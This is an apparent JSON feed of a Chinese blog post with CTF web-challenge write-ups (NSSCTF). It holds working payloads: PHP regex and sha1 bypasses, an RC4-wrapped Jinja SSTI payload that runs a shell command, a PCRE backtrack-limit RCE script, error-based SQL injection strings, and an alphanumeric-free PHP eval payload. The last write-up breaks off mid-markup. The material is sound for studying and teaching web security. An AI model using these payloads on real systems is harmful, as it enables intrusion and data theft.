{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog • All posts by \"nssctf精选\" category",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/06/04/nssctf3/",
            "url": "https://hq185187.github.io/2023/06/04/nssctf3/",
            "title": "NSSCTF3",
            "date_published": "2023-06-04T03:29:05.659Z",
            "content_html": "<h2 id=\"31鹤城杯-2021middle-magic\"><a class=\"markdownIt-Anchor\" href=\"#31鹤城杯-2021middle-magic\">#</a> 31.[鹤城杯 2021] Middle magic</h2>\n<p>考点:</p>\n<ul>\n<li>绕过 preg_mathch 函数</li>\n<li>sha1 弱类型比较</li>\n<li>php json 绕过</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;./flag.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;./result.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &lt; <span class=\"number\">20</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class=\"string\">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/pass_the_level_1#/&#x27;</span>, <span class=\"variable\">$aaa</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;here is level 2&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>] == <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>])</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">            <span class=\"comment\">// START FORM PROCESSING</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>]) === <span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$level_3</span> = <span class=\"title function_ invoke__\">json_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;level_3&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"variable\">$level_3</span>-&gt;result == <span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success:&quot;</span>.<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you never beat me!&quot;</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;out&quot;</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;no&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// perform validations on the form data</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nonono!&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>第一个 preg_replace 绕过相当于绕过 preg_match, 正则写法有缺陷， <code>.</code>  用于任意字符匹配但是不包括换行符，而且 <code>^$界定了必须在同一行</code> ，否则匹配不到，直接利用 %0a 换行绕过</p>\n</li>\n<li>\n<p>第二个简单 sha1 弱类型比较，直接数组绕过就行</p>\n</li>\n<li>\n<p>第三个直接用布尔 true 绕过</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?aaa=%0apass_the_level_1%23</span><br><span class=\"line\">为什么不用#?因为#在url中表示界定符</span><br><span class=\"line\">post:</span><br><span class=\"line\">admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"32nisactf-2022is-secret\"><a class=\"markdownIt-Anchor\" href=\"#32nisactf-2022is-secret\">#</a> 32.[NISACTF 2022]is secret</h2>\n<p>dirsearch 扫一下目录发现 robots.txt,secret,console<br>\n 进入 robots.txt 显示这是一个安卓程序<br>\n进入 secret 可以传 <code>?secret=&#123;&#123;7*6&#125;&#125;</code>  返回调试报错<br>\n发现是 rc4 加密，密钥是 HereIsTreasure, 用大佬脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_main</span>(<span class=\"params\">key=<span class=\"string\">&quot;init_key&quot;</span>, message=<span class=\"string\">&quot;init_message&quot;</span></span>):  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;RC4加密主函数&quot;)  </span></span><br><span class=\"line\">s_box = rc4_init_sbox(key)  </span><br><span class=\"line\">crypt = <span class=\"built_in\">str</span>(rc4_excrypt(message, s_box))  </span><br><span class=\"line\"><span class=\"keyword\">return</span> crypt  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_init_sbox</span>(<span class=\"params\">key</span>):  </span><br><span class=\"line\">s_box = <span class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(<span class=\"number\">256</span>)) <span class=\"comment\"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可  </span></span><br><span class=\"line\"><span class=\"comment\"># print(&quot;原来的 s 盒：%s&quot; % s_box)  </span></span><br><span class=\"line\">j = <span class=\"number\">0</span>  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):  </span><br><span class=\"line\">j = (j + s_box[i] + <span class=\"built_in\">ord</span>(key[i % <span class=\"built_in\">len</span>(key)])) % <span class=\"number\">256</span>  </span><br><span class=\"line\">s_box[i], s_box[j] = s_box[j], s_box[i]  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)  </span></span><br><span class=\"line\"><span class=\"keyword\">return</span> s_box  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_excrypt</span>(<span class=\"params\">plain, box</span>):  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;调用加密程序成功。&quot;)  </span></span><br><span class=\"line\">res = []  </span><br><span class=\"line\">i = j = <span class=\"number\">0</span>  </span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> plain:  </span><br><span class=\"line\">i = (i + <span class=\"number\">1</span>) % <span class=\"number\">256</span>  </span><br><span class=\"line\">j = (j + box[i]) % <span class=\"number\">256</span>  </span><br><span class=\"line\">box[i], box[j] = box[j], box[i]  </span><br><span class=\"line\">t = (box[i] + box[j]) % <span class=\"number\">256</span>  </span><br><span class=\"line\">k = box[t]  </span><br><span class=\"line\">res.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(s) ^ k))  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)  </span></span><br><span class=\"line\">cipher = <span class=\"string\">&quot;&quot;</span>.join(res)  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;加密后的字符串是：\\n%s&quot; %cipher)  </span></span><br><span class=\"line\">enc_url = parse.quote(cipher)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;加密后的url编码:\\n&quot;</span> + enc_url)  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;加密后的输出(经过base64编码):&quot;)  </span></span><br><span class=\"line\"><span class=\"comment\"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))  </span></span><br><span class=\"line\"><span class=\"keyword\">return</span> (<span class=\"built_in\">str</span>(base64.b64encode(cipher.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)), <span class=\"string\">&#x27;utf-8&#x27;</span>))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">rc4_main(<span class=\"string\">&quot;HereIsTreasure&quot;</span>, <span class=\"string\">&#x27;&#x27;&#x27;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"33nisactf-2022middlerce\"><a class=\"markdownIt-Anchor\" href=\"#33nisactf-2022middlerce\">#</a> 33.[NISACTF 2022]middlerce</h2>\n<p>PRCE 前置知识:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\">p 神文章</span></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28802/&#x27;</span>  </span><br><span class=\"line\">data=<span class=\"string\">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`nl /f*`;?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span>+<span class=\"string\">&quot;@&quot;</span>*<span class=\"number\">1000000</span>+<span class=\"string\">&#x27;&quot;&#125;&#x27;</span>  </span><br><span class=\"line\"><span class=\"comment\">#这里必须使用特殊字符,@$之类的都是可以的</span></span><br><span class=\"line\">a=requests.post(url=url,data=&#123;<span class=\"string\">&#x27;letter&#x27;</span>:data&#125;)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1\tNSSCTF&#123;6fc410f7-bc4a-423f-b62d-81cd0dc8cbd9&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#这里index.php没有闭合&lt;?所以要先用?&gt;闭合</span></span><br></pre></td></tr></table></figure>\n<p>另外:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=?&gt;时一种PHP短标记方式,里面可以输入PHP代码执行,且输出时不用echo,直接输入内容就行,这里用``来执行系统命令,再用&lt;?=?&gt;输出</span><br></pre></td></tr></table></figure>\n<h2 id=\"34nisactf-2022join-us\"><a class=\"markdownIt-Anchor\" href=\"#34nisactf-2022join-us\">#</a> 34.[NISACTF 2022]join-us</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;#   message: txw4ever</span><br><span class=\"line\">1&#x27; order by 3# 不要耍小心思喔~</span><br><span class=\"line\">可见此题有过滤</span><br><span class=\"line\">报错注入,没有禁用extractvalue</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#</span><br><span class=\"line\"></span><br><span class=\"line\">XPATH syntax error: &#x27;~Fal_flag,output&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">然后column被禁用,采用join拼接绕过</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,(select *from (select *from output a join output b)c)))#</span><br><span class=\"line\"></span><br><span class=\"line\">Duplicate column name &#x27;data&#x27;</span><br><span class=\"line\">截取试试</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,substr((select group_concat(data) from sqlsql.output),1,31)))#</span><br><span class=\"line\"></span><br><span class=\"line\">substr被禁用,用mid</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,mid((select group_concat(data) from sqlsql.output),1,20)))#</span><br><span class=\"line\"></span><br><span class=\"line\">再将1,20换成20,40和40,60</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"35swpuctf-2021-新生赛hardrce_3\"><a class=\"markdownIt-Anchor\" href=\"#35swpuctf-2021-新生赛hardrce_3\">#</a> 35.[SWPUCTF 2021 新生赛] hardrce_3</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;wllm&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$wllm</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;wllm&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\^&#x27;</span>, <span class=\"string\">&#x27;\\~&#x27;</span>, <span class=\"string\">&#x27;\\|&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$wllm</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[a-zA-Z0-9]/is&#x27;</span>, <span class=\"variable\">$wllm</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"variable\">$wllm</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>毫无疑问的无字母数字 rce, 过滤了～和 ^, 不能取反和异或只能自增</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//测试发现7.0.12以上版本不可使用</span><br><span class=\"line\">//使用时需要url编码下</span><br><span class=\"line\">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class=\"line\">固定格式 构造出来的 assert($_POST[_]);</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>\n<p>测试时发现_=phpinfo (); 可以，但是 system (),passthru 一堆系统执行函数不能用，应该被禁用了，这里用 file_put_contents 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 